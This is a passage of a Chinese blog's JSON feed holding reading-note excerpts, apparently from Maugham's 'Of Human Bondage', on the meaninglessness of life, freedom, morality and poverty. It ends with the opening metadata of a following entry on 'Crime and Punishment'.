            "content_html": "<p>生活没有意义，人活着也没有目的。出世还是不出世，活着还是死去，均无关紧要。生命微不足道，而死亡也无足轻重。尘世毫无残忍可言。</p>\n<h3 id=\"4-10\"><a class=\"markdownIt-Anchor\" href=\"#4-10\">#</a> 4-10</h3>\n<p>他不在试着去理解内容，而是像鹦鹉学舌那样硬把那些句子往自己脑袋里塞。</p>\n<p>孩子的故作镇静原来是某种本能反应，认为在人前流露感情是丢脸的事。</p>\n<p>他养成了博览群书的习惯。但他自己没有意识到，这一来却给自己找到了一个逃避人生忧患苦难的庇护所，也没有意识到，他正在为自己臆造出一个虚无缥缈的环境，转而又使得日常的现实世界成了痛苦失望的源泉。</p>\n<p>此刻他暗自流泪，倒不是由于挨了揍，身子疼痛，也不是因为他们看到了自己的残足，蒙受了羞辱，而是恼恨自己懦弱，这么经不起折磨，最后竟乖乖的把脚伸了出去。</p>\n<p>他们一心只盼皇家公学能保持其固有的老传统。那些僵死的语言，教师们教起来道地的无以复加，孩子们日后往往一想到荷马或维吉尔，就不免泛起一股厌恶之感。</p>\n<h3 id=\"4-11\"><a class=\"markdownIt-Anchor\" href=\"#4-11\">#</a> 4-11</h3>\n<p>热情溢于言表，乃是缺乏教养的表现。热情冲动，绝非绅士应有的风度，让人联想到救世军吹吹打打的哄闹场面。热情意味着变动，这些老夫子想到合人心意的传统积习危在旦夕，前途简直不堪设想。</p>\n<p>他颇怀疑目前通行的学科考试有何用处，学生们死记硬背无非是为了应付这些考试。他注重的是常识。</p>\n<p>这位 “瞌睡虫” 先生，成天聋拉着眼皮，一副没精打采的样子，似乎对一切都感到厌倦。他还算恪尽职守，不过干什么都心不在焉。他心地善良，性情温和，就是有点迂拙。</p>\n<p>他快读书这一雅癖，使他变得落落寡合。疲倦破跌成了他生活的第一需要，他无论和谁呆在一块，不多一会便感到厌烦和倦燥；他自持博览群书，学识丰富，不把旁人放在眼里；他思维敏捷，又不善于掩饰，对于同伴们的愚昧无知，轻蔑之情往往溢于言表。</p>\n<p>他具有一种揭别人伤疤的残忍本能，而且也往往因其一针见血而招人怨恨。</p>\n<p>由于失去了奋斗目标，他心灰意懒，觉得功课学的好坏都无所谓。每天一早醒来，他心情十分沉重，因为又得熬过枯燥无味的一天。现在他干什么都觉得厌烦，因为这全是别人要他干的。他对校方规定的各种限制极其反感，这倒不是因为这些限制不合理，而在于他们本身就是束缚人们身心的条条框框。他渴望得到解脱。</p>\n<p>菲利普向来很容易被别人的情感所打动，尽管从外表看，他常常不动声色，内心感受难得见于言表。这一方面他生性如此，另一方面也是多年来在学校养成的习惯 —— 实质上却极易动感情。</p>\n<p>他憎恶这里，因为他被迫要在那儿参加各种冗长而两人生厌的仪式。</p>\n<p>人们性格中各种乖戾因素全都暴露无遗，没有什么可以使他们有所节制。他们变得心胸狭窄，脾气古怪。</p>\n<p>他每每想到要去过那种生活就不寒而栗，不，他要跨过去，到尘世中去。</p>\n<p>学校里死啃书本的笨学生，成绩往往比偷懒的聪明学生要好。</p>\n<h3 id=\"4-12\"><a class=\"markdownIt-Anchor\" href=\"#4-12\">#</a> 4-12</h3>\n<p>他本不把那些奖品放在眼里，因而打算颇有戏剧性地放弃这些唾手可得的东西，现在如果突然也像普通人一样去明争暗夺，这种前倨后恭的态度岂不贻笑于他人。</p>\n<p>他愿意何时安寝就何时安寝，高兴何时起床就何时起床。再没有人在他面前发号施令，要他干这个那个。今后在无需违心撒谎了。</p>\n<p>一杯酒外加一斗烟，就可帮助他承受生活全部的重担。</p>\n<p>在这个国家里，什么自由都没有：被陈规陋习压得透不过气来，既不能无拘无束的思想，也不能随心所欲的行动。就因为他是个民主国家。</p>\n<p>“我情愿让我女儿死在我脚下，也不放她们去听那个无耻之尤的无聊废话。”</p>\n<p>等他清楚的看到为自由 —— 所谓 “自由” 就是指建立共和国 —— 所做的一切努力无非是换一副枷锁而已，便怀着厌恶的心情离开了这里。</p>\n<p>“自由” 这个字眼，这个似乎具有无限魔力的字眼，始终赋予他支撑的力量。直到最后，他被疾病、饥饿、衰老而压垮了。除了给几个穷学生上那么几节课以外，再无其他谋生糊口的手段了。而且他还发现自己置身于这座外表整洁的小城镇，备受专制独裁暴政的蹂躏，其肆虐程度，更甚。</p>\n<p>也许在他沉默寡言的外表之下，隐伏着对人类的蔑视，因为他的同类，已背弃了他年轻时代所憧憬的那些伟大的理想，沉湎于碌碌无为的怡适之中。说不定三十年的革命已经使他懂得，人类是不配拥有自由的，他醒悟过来，自己一生孜孜以求的目标原来并不值得探求。</p>\n<p>由于生性怯懦，或者说，由于在他身上出现某种返祖遗传 —— 承继了穴居人的习性，他在同别人打交道时，总是心生厌恶，一直等到以后熟稔了，才会消除初次见面时别人给自己留下的坏印象。</p>\n<p>他也脱不了此巢穴，在身心的陶冶方面，他也总得迷恋些别的什么。</p>\n<p>他可不愿充当考人手里的玩偶，他让人感到优异的考试成绩不免沾有几分市井之气。</p>\n<p>虽然读的时候并不觉得都饶有趣味，但他锲而不舍地往下钻。他感到自己太未知太浅薄，热切地希望自己能有所长进。</p>\n<h3 id=\"4-13\"><a class=\"markdownIt-Anchor\" href=\"#4-13\">#</a> 4-13</h3>\n<p>“凡是正确的东西，不问为什么，他一概顶礼膜拜。”</p>\n<p>只要他演奏的出神入化，错弹几个音符又何足道哉？这段议论给了菲利普很深的印象，殊不知世间有多少无能之辈正是借这种无知妄说聊以自慰呢！</p>\n<p>如果说，个人感受才是衡量事物的尺度，那就全不必把逻辑放在眼里，既然逻辑又是他的薄弱环节，能把他甩开岂不是正中下怀？</p>\n<p>我就是讨厌僵死的定义：那么丑陋，那么一目了然。</p>\n<p>对于唯一神教派的教徒来说，凡是世人相信的事物，他差不多一概及其真诚地不予相信，而对凡是自己不甚了然的事情，都深信不疑。</p>\n<p>一代人又一代人的信仰。您的那些圣人生活在有信仰的年代里，在他们那种时代，那些在我们看来绝对无法置信的事物，他们却几乎不能不奉为玉律金科。</p>\n<p>信仰是外界强加给他的，这完全是环境和榜样在起作用。新的环境和新的榜样，给了他认识自我的机会。抛弃童年时代所形成的的信仰，毫不费事，就像脱掉一件他不在需要的斗篷一样。</p>\n<p>他摆脱了对沉沦堕世的恐惧，摆脱了世俗偏见的羁绊，他尽可以走自己的路，不必在害怕地狱之火的无情折磨。现在，他可以在无拘无束的气氛中自由的呼吸。他的一言一行只需对自己负责就行了。</p>\n<p>在他看来，戏剧是真实生活，那是一种阴森而痛苦的奇怪生活，男男女女都把自己内心的邪念暴露在无情的睽睽众目之下：姣好的容貌把堕落的灵魂包藏了起来；君子淑女拿德行当做掩饰丑恶隐私的面具；徒有其表的强者由于自身的弱点而逐渐演为色厉内荏。</p>\n<p>年轻人似乎成了一场共谋的牺牲品，因为他们所读过的书籍，还有长辈之间的交谈，都为他们开拓了一个虚假的生活场景。年轻人得靠自己去发现：过去所念到的书，过去听到过的话，全是谎言、谎言、谎言！</p>\n<p>她们举止粗野，那儿的生活平淡无奇。置身于那种古板划一的环境，人的心灵怎能得到升华？</p>\n<p>他们的欢乐还是那么粗俗，他们的心灵是多么平庸，那一伙放浪形骸之徒，不论作为艺术家，还是作为凡人，都一无可取之处。</p>\n<h3 id=\"4-14\"><a class=\"markdownIt-Anchor\" href=\"#4-14\">#</a> 4-14</h3>\n<p>他觉得沉默反倒比言语更能帮自己的忙，他可以用目光表达无法言传的感情。</p>\n<p>“那些商业中很管用的学问，学校里是从不教给学生的呢。”</p>\n<p>生活凄凉的可怕。他开始厌恶这所客寓，厌恶在这里度过的悲凉凄清的漫漫长夜。有时候他感到孤独难熬，连书也看不进去，于是就一小时又一小时地坐在屋里发愣，双眼死瞪着壁炉，陷入极大的悲苦之中。</p>\n<p>他在冷清清的小房间里胡乱吞了些食物充饥，晚上就借书解闷，万般愁思压得他几乎没法忍受。</p>\n<p>他领给菲利普看的，是个庸俗低级的巴黎，但是菲利普却用一双被幻觉迷住的眼睛，看着这个扑朔迷离的城市。</p>\n<p>他们海阔天空，无所不谈；大家七嘴八舌，只顾自己叽叽呱呱，根本不会理会旁人说些什么。</p>\n<p>缺少道德上的内容，任何伟大的艺术都不可能存在。</p>\n<p>他也像一般生性孤傲的人那样，洁身自好，独来独往，对市井之徒的古怪行径横眉侧目，不胜厌恶。向来瞧不起大轰大嗡的芸芸众生。</p>\n<p>事实上，他完全醉了，不过既然他喝下肚的充其量只有一杯啤酒，那么使他陶然忘情的，只可能是一种比酒精更危险的麻醉剂。</p>\n<p>作品里缺少道德上的感染力，观赏这些作品，也无助于人们去追求更纯洁、高尚的生活。</p>\n<p>绝不是，她不过是已摆脱了世俗的偏见而已，但同时也就抛弃了名誉、德行、良知、体面 —— 抛弃了一切。</p>\n<p>人们总是抱有一种幻觉，以为自己的意志是自由的，而且这种幻觉如此根深蒂固，以致连我也乐意接受他了。当我采取这种或那种行动的时候，总以为自己是个有自由意志的作俑者。其实事成之后就很清楚：我所采取的行动，完全是各种各样的永恒不灭的共同作用的结果，我个人向防止也防止不了了。</p>\n<p>社会用名誉、财富以及同胞们的褒奖做钓饵，想诱使我为他效劳，可同胞们的褒奖，我不稀罕，名誉，我也不放在眼里。我虽无万贯家财，日子不照样还混得挺好。</p>\n<h3 id=\"4-15\"><a class=\"markdownIt-Anchor\" href=\"#4-15\">#</a> 4-15</h3>\n<p>别人和我有何相干？我只关心我自己。反正人类中的大多数都是为了捞名利才干事的，而他们干的事总会直接或间接的给我带来方便，我乐得坐享其成呢。</p>\n<p>菲利普已今非昔比：往日那一整套有关艺术、人生和文学的见解，而今一概视如敝履；至于那些至今仍抱住这些迂腐成见之人，他简直无法容忍。</p>\n<p>他对自己很不满意。他想获得的东西，生活就是不给。他心里很不是滋味，觉得自己是在蹉跎光阴。</p>\n<p>他简直没法理解自己。难道是由于自己的那种似乎净在夸大伊人的不尽如人意之处的畸形视觉，他才永远只有在心上人不在跟前的时候才能去爱，而一旦有机会和她面面相对，反觉扫兴的吗？</p>\n<p>菲利普实在没办法理解，藏在宽阔的眉宇后面的思想，竟是那么浅薄平庸，那对灼灼有光、热情洋溢的眸子，竟只看到生活中浮光掠影的表象。</p>\n<p>纵目望去，只见碑石林立，有的简陋，粗俗，有的浮光俗气，不堪入目。</p>\n<p>庸俗的生活趣味，使他们的面容显得呆板愚钝，唯有那一双狭窄的小眼睛在咕溜溜的打转。他们鼠目寸光，胸无大志。你可以感受到，对所有这些人来说，生活无非是一长串的琐事和邪念罢了。</p>\n<p>但他们狂舞不止，仿佛是受着身体内某种力量的驱使，而在菲利普看来，驱使他们向前的乃是一种追求享受的冲动。他们不顾一切的想要逃避这个充满恐怖的现实世界。</p>\n<p>他们的眼神凶悍而残忍，尽管他们的兽欲使他们脱却了人形，尽管他们的面容显得卑劣而凶狠，尽管最糟糕的还在于他们的愚蠢无知，然而，那一双虎视眈眈的眼睛却掩饰不住内心的极度痛苦，使得这一群浑浑噩噩之徒，显得既可怕又可怜。</p>\n<p>菲利普早年凄楚不幸的学校生活，唤起他内心的自我剖析机能。他在不知不觉染上这种怪癖，就像吸毒成瘾那样，早已根深蒂固，无从摆脱。</p>\n<p>伟大也罢，渺小也罢，我们才不着重世人的这些褒贬之词哩。我们的作品问世之后会有怎么样的遭遇，那是无关紧要的；在我们作画的时候，我们已经获得了所能获得的一切。</p>\n<h3 id=\"4-16\"><a class=\"markdownIt-Anchor\" href=\"#4-16\">#</a> 4-16</h3>\n<p>克拉顿同自己过不去，也同周围世界过不去；他愈来愈狂热的追求那种可望而不可及的尽善尽美的艺术境界，却拿不出什么作品来，最后说不定还会沦为酒鬼。</p>\n<p>既然人生在世只有一次，那就切不可虚度此生。他并不认为只有发迹致富，名扬天下，才算没枉活于世，可究竟怎样才无愧此生，他自己也说不上来。也许应该阅尽人世沧桑，做到人尽其才吧。</p>\n<p>除非由你自己悟出其中的奥妙来，否则便毫无意义。</p>\n<p>他们明明屈从于某种影响，自己却从未有所察觉，像中了邪似的受着本能驱使和愚弄，只是自己还不知道罢了。生活打他们身边一溜而过，一辈子就像没活过一样。</p>\n<p>菲利普觉得生活嘛，就该痛痛快快的生活，而不应该成为仅仅可入画面的题材。他要阅历世事，从人生的瞬间里吸取生活所提供的全部激情。</p>\n<p>没有足够的收入，生活的希望就被截去了一半。你得处心积虑，锱铢必较，决不为转的一个先令而付出高于一个先令的代价。</p>\n<p>穷困会使一个人变得很贫贱。它使你蒙受没完没了的羞辱，扼杀掉你的雄心壮志，甚至像癌一样吞噬你的灵魂。</p>\n<p>等你追悔不及的时候才发现自己的平庸无能，那才叫人痛心呢，但再痛心，也无助于改善一个人的气质。</p>\n<p>我想，一个人与其在别人的指点下规规矩矩的行事，还不如让他自己去闯闯，出点差错，反能获得更多的教益。</p>\n<p>他把有关德行和罪恶的陈腐观念以及有关善与恶的生存法则，统统从脑子里清除了出去，并抱有宗旨，要给自己另外找出一套生活的准则。他不知道生活中是否非要有道德准则不可。显然，世间许多 “道理” 他之所以觉得言之成理，无非是因为从小人们就是这么教育他的，如此而已。</p>\n<p>他相信能把握住自己，不为周围舆论所左右。不管怎么说，他还得活下去，它给自己定了这样一条准则：尽可随心所欲，只是得适当留神街角处的警察。</p>\n<h3 id=\"4-17\"><a class=\"markdownIt-Anchor\" href=\"#4-17\">#</a> 4-17</h3>\n<p>看来，似乎并不是因为你是按某种方式思维，所以才按某种方式行事；实际上，你之所以按某种方式思维，倒是因为你是按某种方式造就而成的。</p>\n<p>压根儿就没有 “真理” 这种东西。每个人都有其一套哲学。过去的伟人先哲所煞费苦心炮制出的整套观念，仅仅对著作者自己有效。</p>\n<p>生后在外国有这样一个好处：你既能具体接触到周围人民的风俗习惯，又能作为旁观者客观的加以观察，从而发现那些被当地人视为须臾不可缺少的风俗习惯，其实并且遵从的必要。</p>\n<p>世间的事物本无善恶之分，无非是适应某种目的而存在的。</p>\n<p>凡是对社会有利的行为，皆被称为善举；凡是于社会有罪的行为，则被唤作恶行。所谓善与恶，无非就是这个意思。而所谓 “罪孽”，实在是自由人应该加以摆脱的一种偏见。</p>\n<p>答案得由你自己找不出来，否则就不成其为答案。</p>\n<p>遇到这种事，哪怕是再明显不过的谎言，也最好装聋作哑，姑且信之。</p>\n<p>他在米尔德丽德身上看到的分别是她的本来面目。她一无情趣、二不聪明，思想又相当平庸；她身上那股狡黠的市井之气，更叫菲利普反感。她没有教养，也缺少女性特有的温柔。</p>\n<p>处在当时那种情况之下，个人的想法是多么的无足轻重；他那一套经过精心构思，并使他感到十分满意的个人处世哲学，到头来竟一点也帮不了他的忙。</p>\n<p>他酸溜溜的对自己说，她跟那个华而不实、爱说爱笑的同伴倒是天造地设的一对。</p>\n<p>而且同样的故事，他们百看不厌，我只要换换名字就行了。</p>\n<p>她除了希望眼下这种日子得以继续延续之外，别无他求。</p>\n<p>要是成天想着今天，愁着明天，生活还有什么意思呢？就是事情糟到无可再糟的地步，我想总还是有路可走的。</p>\n<p>我一生种碰到一种人，他们能从生活经历中学习些东西，这种人寥寥无几，而你就是其中一个。</p>\n<p>我看不出老是翻来覆去地读同样的东西有什么意义，这只不过是一种既无聊又费劲的消遣罢了。但我并没有一颗伟大的脑瓜，对一个思想最深邃的作家的作品只要读一遍就能理解。</p>\n<h3 id=\"4-18\"><a class=\"markdownIt-Anchor\" href=\"#4-18\">#</a> 4-18</h3>\n<p>一个人所读的书或做的事，在大多数情况下，对他毫无作用。然而，有些事情对一个人来说确实具有一定的特殊意义。</p>\n<p>海沃德耽于幻想的豪兴不衰，幻想成了他引以为乐的伙伴。其实，幻想对他毫无意义，因为幻想对他从没发生过什么影响。而他对幻想却如此虔诚。</p>\n<p>在他看来，生活毕竟是生活，有其自身的规律。直到现在，他还清晰的记得先前那种左右着她一切言行的情感的威力，以及他对此束手无策，犹如他周身被绳索死死的捆在地上一般。他从书中懂得了不少道理，可却只会从自己的经验出发对事物作出判断。他始终感到有一股不可抗力在驱使着自己向前。</p>\n<p>理性的作用不过是向她指出获得她心心念念想获得的东西的途径而已。</p>\n<p>眼下的生活愈来愈显得枯燥乏味。他平生所遭受的一切不幸，都从那种意义上的充满激情、极为兴奋的生活中得到了补偿。</p>\n<p>在采取行动之前，我总认为我可以自由选择，而我就是在这种思想支配下做事的。但当事情做过以后，我才发现那样做是永远无法避免的。</p>\n<p>纵然她无心无肝、腐化堕落和俗不可耐，纵然她愚蠢无知、贪婪鳍欲、他都毫不在乎，还是爱恋着她。他宁可同这一结合在一起过痛苦悲惨的日子，也不愿同那一个在一起共享鸾凤和鸣之乐。</p>\n<p>为了一宗你知道不会长久的男女私情而牺牲自己的一切，那是不值得的。</p>\n<p>你以为我还在乎我是个绅士嘛？要是我是个绅士，我就决不会在像你这样的俗不可耐的荡妇身上浪费时间了。</p>\n<p>她对菲利普报以淡淡的一笑。这使得菲利普想起来一条狗因淘气挨打后，为讨主人的欢心，脸上露出一种胆怯、奉承的表情来。</p>\n<p>他内心有某种东西消失了，他痛切的感到了这一点，仿佛什么东西崩塌了一般。他只觉得自己莫名其妙地虚弱不堪。</p>\n<p>他们是一对蠢货，都满足于在一切磨牙扯淡。他们俩旨趣鄙俗下流，真是天造地设的一对。</p>\n<h3 id=\"4-19\"><a class=\"markdownIt-Anchor\" href=\"#4-19\">#</a> 4-19</h3>\n<p>眼下他只能忍气吞声接受这个不可避免的结局。他悲痛欲绝，宁愿去死。但理智告诉他，只有一次的生命不允许他去那样做。</p>\n<p>他们俩均本性粗俗，都拥有一种能挑起她平庸的幽默感的庸俗的逗笑本领，而使他们能得手的也许还是放浪形骸的性行为，这正是他们俩与众不同的特别之处。</p>\n<p>那平静的表情，不过是一张自己自觉不自觉套在脸上的假面具，其作用宛如彩蝶身上的保护色而已，相反他却为自己的意志薄弱感感到震惊。</p>\n<p>他考虑他所需要做的事情，以及何时采取行动，但在连他自己也莫名其妙的本能和情感的控制之中，他显得无能为力，一筹莫展。他做起事来就像是部机器，在他所处的环境和他的人格这两股力量的驱使下运转一般。他的理智却像个人在一旁冷眼旁观，而无力参与其中。</p>\n<p>这种死亡之所以不可避免，是因为这个人不过是错综复杂的社会文明这部庞大机器上的一个小小齿轮，就像一部自动机那样，压根无力改变自己周围的环境。要病痊愈，他就得彻底休息。</p>\n<p>一切是那么冗长乏味，即饶有兴趣而又平淡无奇。它是多么的喧嚣，热闹，又那么严肃；它是多么的可悲，可笑，又那么的微不足道；它既简单又复杂，有欢乐，又包含着绝望：欲望摇曳着沉重的步伐穿过房间，惩罚着罪人和无辜者以及一筹莫展的妻子们和可怜的孩子们。</p>\n<p>这儿既不好，也不坏，有的只是赤裸裸的事实。这就是生活。</p>\n<p>我是个流落在一个陌生城市里的异乡客，深受市侩们的蹂躏。</p>\n<p>我穿过挤满人群的街道时，人们把我推过来寄过去的，仿佛走在一座死城里一样。我只觉得我不能死在那里。我想死在我自己的人民中间。我自己也不知道最终是一种什么样的隐秘的本能把我拉回来的。</p>\n<p>一个人要是准备承担一切后果，那他干什么都没有顾忌。</p>\n<p>有时候，当我一个人独坐的时候，我也害怕过。但我并不为我的害怕心理所吓倒。</p>\n<h3 id=\"4-20\"><a class=\"markdownIt-Anchor\" href=\"#4-20\">#</a> 4-20</h3>\n<p>眼下，虽说我身体虚弱、上了年纪，身患病重，一贫如洗，而且已行就将木，但我的命运依然掌握在我的手心。因此，我没什么好遗憾的。</p>\n<p>刚刚结束的那条生命毫无价值。问题倒不在克朗肖是死还是依然活着，哪怕世界上从来就没有克朗肖这个人，情况还是如此。</p>\n<p>人们只凭自己的情感去行动的，但是他们的情感有可能是好的，也有可能是坏的呀。看来，他们的情感是把他们引向成功还是毁灭，纯粹是偶然的际遇而已。人生就像是一片无法摆脱的混沌。人们在这种无形的力量下四处奔波，但是对这样做的目的何在，他们却一个也回答不出。</p>\n<p>只要那些东西美丽动听，就是不真实，那又有什么关系呢。要求每一件事既符合你的理智又符合你的审美观，那你的要求也太高了。</p>\n<p>这里对他来说非同一般，因为他终于摆脱了传统习俗的束缚而在这里找到了精神庇护所，他的婚后生活告诉他传统习俗实在令人厌倦。</p>\n<p>这种轻而易举的谎言只能给那些智力平平、浅尝辄止的人带来无穷的乐趣。我们走步他们的后尘，也只能体验一下他们所体验过的感觉而已，然而，那里除了显而易见的东西之外，再也没有别的什么了。</p>\n<p>那些绅士，脸色苍白，面容憔悴，但不是由劳累过度而是由精神备受压抑才这样的。他们的头脑惨遭摧残。他们走路时，仿佛对世界之美毫无意识似的。因为他们的眼睛只是注视着自己的心，所以他们被灵魂世界的壮观搞的眼花撩乱。</p>\n<p>生活充满了激情，色彩斑澜。正因为生活提供的东西太多，所以他们的欲望永无止境，总是渴望得到更多更多。正因为他们也是人，所以他们的欲壑难填，于是，他们将他们的勃勃生气化为追求不可言喻的东西的激情。</p>\n<p>理想主义在生活面前太多胆怯的退却。理想主义之所以退却，是因为他不能忍受人们相互你争我夺；他自己没有勇气奋起而战，于是把斗争说成庸俗的。他自己庸庸碌碌，可当同伴们并不像他看自己那样对待他时，他就蔑视伙伴们，并且聊以自慰。</p>\n<h3 id=\"4-21\"><a class=\"markdownIt-Anchor\" href=\"#4-21\">#</a> 4-21</h3>\n<p>世间既无美也无丑，而只有事实；追求美完全是感情用事。</p>\n<p>世间还有比他推崇备至的现实主义更为完美的东西，当然这一更为完美的东西当然不是面对人生软弱无力的理想主义。它太强烈，非常有魄力；生活中的欢乐，丑和美、卑劣行径和英雄行为，它都一概接受。它仍旧是一种现实主义，不过是一种更为高级的现实主义。在这种现实意义里面，事实为一种更为鲜明的荣光所改造。</p>\n<p>一个他要接受的非常重要的信息，但是着个信息却是用一种他陌生的语言传递的。他怎么也听不懂。他一直在孜孜不倦探索着人生的意义。他似乎觉得这里已为他提供了答案，却又嫌太隐晦，太空泛。他困惑不解。</p>\n<p>倘若道德不过是件儿给人方便的事儿的话，那善与恶也就没有意义了。</p>\n<p>她把疾病、不幸和世界的残忍统统当作理所当然的事情，觉得人们的行动既无值得赞扬，也无值得责备的地方。</p>\n<p>人们之所以要寻短见，是因为他们没有钱。</p>\n<p>人本来就是一种好模仿的动物，而模仿他人的动作是逗人发笑最简便的方法。</p>\n<p>这一切似乎都表明，人们不过是被一种看不见的力量玩弄于鼓掌之上的傀儡而已，是他在驱使人们做出这样或那样的事情。有时，人们还凭借理智来为其行动辩护，要是做不到这一点，他们干脆悍然不顾理智，一味地蛮干。</p>\n<p>眼下，他脑海里常常掠过自杀的念头，但是他竭尽全力不让自己去想这个问题，生怕自杀的念头一旦占了上风，它就无法控制住自己。他一再默默地告诫自己，自杀的举动是荒唐的，因为要不了多久，他就会时来运转的。</p>\n<p>他眼下所处的困境显得太荒谬，因此他根本就没有把他当真。他认为这好比是一场他不得不忍受的疾病，但最后终究会从这场疾病中恢复过来。</p>\n<p>事情既然发生了，那就是不可避免的了，懊恼也是荒唐可笑的。</p>\n<p>他生来独处惯了的，而现在却成天要同别人混在一起，不能独自清静片刻，这事令人毛骨悚然。</p>\n<p>他将不得不使出浑身解数，以保全他现有的这一低贱的差使。</p>\n<h3 id=\"4-22\"><a class=\"markdownIt-Anchor\" href=\"#4-22\">#</a> 4-22</h3>\n<p>事情果真如此，他将干些什么，心理早已拿定主意了，决不会让这种日子拖的太久的。它之所以还能忍气吞声的活着，就是因为他还有所指望。没有了希望，也就没有了恐惧。到那时，唯一的断然措施就是自杀。</p>\n<p>倘若事情到了忍无可忍的地步，不管怎么说，他还是有办法对付的。</p>\n<p>他生怕一旦披露了自己的心迹，他的精神就会彻底崩溃。更重要的是，他对以前遭受过不幸的地方具有一股无法遏制的厌恶情绪。</p>\n<p>他们一个个容貌丑陋至极，脸上无不流露出一副卑贱相，叫人看了实在可怕，他们的脸面被下贱的欲念所扭歪，令人感到他们对任何一个美好的思想都视为不可思议。他们生就一双狡黠的眼睛，一个不堪一击的下巴颏，他们虽无害人之心，却一个个俗不可耐、狭隘伪劣。他们的幽默感既低级又滑稽可笑。</p>\n<p>菲利普想起那些张口呆看的游览观光者，那些受捧旅游指南、大腹便便的异国客，以及那些为满足不足挂齿的欲念和俗不可耐的爱好而蜂拥挤入商店的平庸之辈，他们都是人，最终都不免一死。但这们这一辈子过的都是丑恶的、下贱的日子。</p>\n<p>随着时光的流逝，他不知怎么的却一事无成，最后竟自暴自弃，心甘情愿的成了一名败北者。现在他死了。他活得毫无意义，死得毫无价值。他极不光彩的死于一种愚昧的病症，直到生命终止时，还是功不成名不就，一事无成，仿佛世上从来就没有过他这个人似的。</p>\n<p>人活着究竟有什么意义？世间万物，一切皆空。他活着，不过是个碌碌之辈，无声无息；他一死，就被人忘的一干二净。</p>\n<p>人们一生中所作的努力同其最后结局显得多么不相称啊。人们却要为年轻时对未来的美好憧憬，付出饱尝幻灭之苦的惨重代价。痛苦、疾病和不幸，重重的压在人生这杆天平的一侧，把它压倾斜了。</p>\n<p>菲利普联想到自己的一生，想起了开始步入人生时自己所有的凌云壮志，想起了他身患残疾给他带来的种种限制，想起了他举目无亲、形单影只的景况，想起了他在没有疼爱、无人过问的环境中度过的青春岁月。除了做些看上去是最好的事情之外，他不知道自己还有没有做过别的什么事情。即使如此，他还是一个倒栽葱摔了下来，陷入了深深的不幸之中。</p>\n<h3 id=\"4-23\"><a class=\"markdownIt-Anchor\" href=\"#4-23\">#</a> 4-23</h3>\n<p>一切似乎纯粹是靠碰机会。人无论是正直的还是不正直的，雨露竟毫无偏向地统统洒在他们身上。这里面没有什么道理可讲的。</p>\n<p>人，并不比其他有生命的东西更有意义；人的出现，并非是造物的顶点，而不过是自然对环境作出的反应罢了。</p>\n<p>人降生世上，便受苦受难，最后双目一闭，离世而去。生活没有意义，人活着也没有目的。出世还是不出世，活着还是死去，均无关紧要。生命微不足道，而死亡也无足轻重。尘世毫无残忍可言。不论是做过的还是没来得及做的事，一概都无关宏旨。失败毫无足奇，成功也等于零。他不过是暂时占据地球表层的芸芸众生中间的一个最不起眼的动物而已。</p>\n<p>有一种格局，最明显，最完美无缺，同时也最漂亮动人。这种格局是，一个人呱呱坠地地来到人间，渐渐长大成人，恋爱结婚，生儿育女，为挣片面包而含辛茹苦，最终蹬腿弃世而去。</p>\n<p>但是生活还有别的样式的格局，这些格局虽杂乱无章，却是妙不可言，幸福从未涉足其间，人们也不追逐功名，但从中可以感受到一种更加乱人心思的雅趣。</p>\n<p>幸福跟痛苦一样的微不足道，他们的降临，跟生活中出现的其他细节一样，不过是使得人生格局更趋纷繁复杂罢了。</p>\n<p>在菲利普看来，除了耽于口腹之乐和对金钱的占有欲之外，生活的一切乐趣都在那个老头身上丧失殆尽。</p>\n<p>生活不过是没完没了的干活，既不美也不丑，只是像接受四替转换那样接受这种生活。时间一切似乎都毫无意义，他不由变得激愤起来。他不甘使自己相信人生毫无意义的说法，而他所见的一切，他的全部思想，无不更加坚定了他的信念。虽然他不胜愤慨，但这是一种令人快乐的愤慨。</p>\n<p>我总是引颈期盼着某些事情，可是，这些事情当真到来了，自己却又感到扫兴。</p>\n<h3 id=\"4-24\"><a class=\"markdownIt-Anchor\" href=\"#4-24\">#</a> 4-24</h3>\n<p>穷人并不艳羡富有者，因为双方的生活方式迥然不同，而且他们怀有一种典型的自得其乐的心理，总认为中产阶级的生活里充满了虚情假意，显得极不自然。</p>\n<p>穷人对有些东西已习以为常，并不感到有什么妨碍，而他们却企图加以改正。他们硬要去改正，结果反而扰乱了他们的安宁。</p>\n<p>经济拮据会使人变得渺小、卑贱和贪婪，会扭曲他的性格，使他以一个庸俗的角度来看待世界。当一个人不得不掂量每一便士的分量时，那金钱就会变得异乎寻常的重要。</p>\n<p>他们有的只是些书本知识，却自负矜夸，目中无人。</p>\n<p>虽说我遭受过这样那样的不幸，但我从来没有放弃过我的目标。眼下，每当我清晨醒来，我浑身骨头酸痛，像是在催促我快点动身。至于到什么地方去，我倒并不介意。</p>\n<p>生活在城市里，我们渴望阳光和光明。那不是生活，是一种长期监禁。</p>\n<p>人皆有缺陷。他们身不由己，不过是盲目的机会的工具而已。</p>\n<p>他仿佛觉得，他一辈子都是遵循着别人通过嘴说手写向他灌输的理想行事，而从来不是依从自己的心愿心事的。他的一生总是受他认为应该做的事情，而不是受他真想想做的事情而左右。</p>\n<p>他老是生活在对未来的憧憬里，却接二连三的错失眼前的良机。</p>\n<p>屈服于幸福，或许就是承认失败，但是，这种失败，却要比千百次胜利有意义的多。</p>\n",
            "tags": [
                "命运",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/42%E3%80%8A%E7%BD%AA%E4%B8%8E%E7%BD%9A%E3%80%8B%E9%99%80%E6%80%9D%E5%A6%A5%E8%80%B6%E5%A4%AB%E6%96%AF%E5%9F%BA/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/42%E3%80%8A%E7%BD%AA%E4%B8%8E%E7%BD%9A%E3%80%8B%E9%99%80%E6%80%9D%E5%A6%A5%E8%80%B6%E5%A4%AB%E6%96%AF%E5%9F%BA/",
            "title": "《罪与罚》陀思妥耶夫斯基",
            "date_published": "2019-06-30T16:00:00.000Z",
